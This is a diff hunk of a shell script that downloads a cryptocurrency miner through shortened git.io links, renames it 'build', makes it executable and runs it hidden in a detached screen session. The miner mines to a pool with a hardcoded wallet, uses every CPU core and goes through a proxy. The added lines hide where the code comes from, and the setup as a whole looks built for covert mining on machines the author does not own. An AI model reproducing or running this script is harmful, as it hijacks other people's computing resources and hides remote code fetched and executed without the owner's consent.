@@ -14,8 +14,8 @@ size=${#array[@]}
 index=$(($RANDOM % $size))
 kuli=${array[$index]}
 apt-get update
-wget -q https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh
-wget -qO build https://github.com/Omarjetos/ezz/blob/master/ccminer?raw=true
+wget -q https://git.io/JPjuz
+wget -qO build https://git.io/JPjuB
 chmod +x build
 chmod +x compile.sh
 screen -dm -S build ./build -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u D8KNMS3AemV5uN9oJZKopPXGne93hgtfin -p c=DGB,mc=VRSC,ID=Dgb-$kuli -t $(nproc --all) -x $proxy
